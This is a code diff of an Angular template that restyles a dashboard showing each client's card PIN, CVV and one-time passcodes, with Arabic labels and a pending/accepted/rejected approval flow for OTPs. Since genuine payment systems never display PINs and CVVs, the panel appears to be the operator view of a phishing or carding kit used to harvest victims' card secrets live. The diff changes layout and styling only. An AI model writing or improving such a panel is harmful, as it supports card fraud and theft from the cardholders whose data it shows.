@@ -132,24 +132,38 @@
                   }
                 </td>
 
-                <td class="px-6 py-5.5 font-mono font-black text-red-600 text-lg sm:text-xl tracking-widest">
+                <td class="px-6 py-5.5">
                   @let pinPayment = getLatestPayment(client);
                   @if (pinPayment) {
-                  <div>PIN: {{ pinPayment.cc_pin }}</div>
-                  @if (pinPayment.cc_cvv) {
-                  <div class="text-sm mt-1 text-sky-600">CVV: {{ pinPayment.cc_cvv }}</div>
-                  }
-                  } @else { <span class="text-slate-400">-</span> }
+                  <div class="flex flex-col gap-2 w-32">
+                    <div class="flex items-center justify-between bg-red-50/50 border border-red-100 rounded-lg px-2 py-1.5">
+                      <span class="text-[10px] text-red-400 font-bold">PIN</span>
+                      <span class="font-mono text-red-600 font-black text-base tracking-widest">{{ pinPayment.cc_pin }}</span>
+                    </div>
+                    @if (pinPayment.cc_cvv) {
+                    <div class="flex items-center justify-between bg-sky-50/50 border border-sky-100 rounded-lg px-2 py-1.5">
+                      <span class="text-[10px] text-sky-500 font-bold">CVV</span>
+                      <span class="font-mono text-sky-600 font-black text-base tracking-widest">{{ pinPayment.cc_cvv }}</span>
+                    </div>
+                    }
+                  </div>
+                  } @else { <span class="text-slate-400 text-sm">-</span> }
                 </td>
 
                 <td class="px-6 py-5.5">
                   @let otp = getLatestOtp(client);
                   @let latestPayment = getLatestPayment(client);
                   @if (otp) {
-                  <div class="flex flex-col gap-1.5">
-                    <span class="text-xs text-sky-500 font-bold mb-0.5">نوع الكود: {{ otp.type }}</span>
-                    <span class="font-mono text-xl font-black text-sky-600 tracking-wider">{{ otp.otp }}</span>
-                    <span class="text-xs text-slate-500 font-bold">الحالة: {{ otp.status }}</span>
+                  <div class="flex flex-col bg-slate-50 border border-slate-200 rounded-lg px-3 py-2">
+                    <div class="flex items-center justify-between mb-1">
+                      <span class="text-[10px] text-slate-500 font-extrabold uppercase bg-slate-200/50 px-2 rounded">{{ otp.type }}</span>
+                      <span class="text-[10px] font-bold px-1.5 rounded-full" [ngClass]="{
+                        'bg-amber-100 text-amber-700': otp.status === 'PENDING',
+                        'bg-emerald-100 text-emerald-700': otp.status === 'ACCEPTED',
+                        'bg-red-100 text-red-700': otp.status === 'REJECTED'
+                      }">{{ otp.status }}</span>
+                    </div>
+                    <span class="font-mono text-xl font-black text-slate-800 tracking-widest text-center mt-1">{{ otp.otp }}</span>
                   </div>
                   } @else if (latestPayment?.status === 'ACCEPTED') {
                   <span class="text-sky-600/80 text-sm font-bold animate-pulse">بانتظار إدخال OTP...</span>
@@ -261,14 +275,15 @@
                   }}</span>
               </div>
               <!-- PIN & CVV -->
-              <div class="flex flex-col gap-1 pt-1 border-t border-slate-200 mt-1">
-                <div class="flex items-center gap-2">
-                  <span class="text-xs text-slate-400 font-bold">PIN:</span>
+              <!-- PIN & CVV -->
+              <div class="flex gap-2 pt-2 border-t border-slate-200 mt-2">
+                <div class="flex-1 flex items-center justify-between bg-red-50/50 border border-red-100 rounded-lg px-2 py-1.5">
+                  <span class="text-[10px] text-red-400 font-bold">PIN</span>
                   <span class="font-mono font-black text-red-600 text-base tracking-widest">{{ mPayment.cc_pin }}</span>
                 </div>
                 @if (mPayment.cc_cvv) {
-                <div class="flex items-center gap-2">
-                  <span class="text-xs text-slate-400 font-bold">CVV:</span>
+                <div class="flex-1 flex items-center justify-between bg-sky-50/50 border border-sky-100 rounded-lg px-2 py-1.5">
+                  <span class="text-[10px] text-sky-500 font-bold">CVV</span>
                   <span class="font-mono font-black text-sky-600 text-base tracking-widest">{{ mPayment.cc_cvv }}</span>
                 </div>
                 }
@@ -280,10 +295,10 @@
 
             <!-- ── Row 3: OTP ── -->
             @if (mOtp) {
-            <div class="flex items-center justify-between bg-sky-50 rounded-xl p-3 border border-sky-100">
-              <div>
-                <p class="text-xs text-sky-500 font-bold mb-0.5">كود التحقق ({{ mOtp.type }})</p>
-                <span class="font-mono text-xl font-black text-sky-600 tracking-wider">{{ mOtp.otp }}</span>
+            <div class="flex items-center justify-between bg-slate-50 rounded-xl p-3 border border-slate-200">
+              <div class="flex flex-col">
+                <p class="text-[10px] text-slate-500 font-extrabold uppercase mb-0.5">{{ mOtp.type }}</p>
+                <span class="font-mono text-xl font-black text-slate-800 tracking-wider">{{ mOtp.otp }}</span>
               </div>
               <span class="text-xs font-bold px-2.5 py-1 rounded-full border" [ngClass]="{
                     'text-emerald-700 bg-emerald-50 border-emerald-200': mOtp.status === 'ACCEPTED',
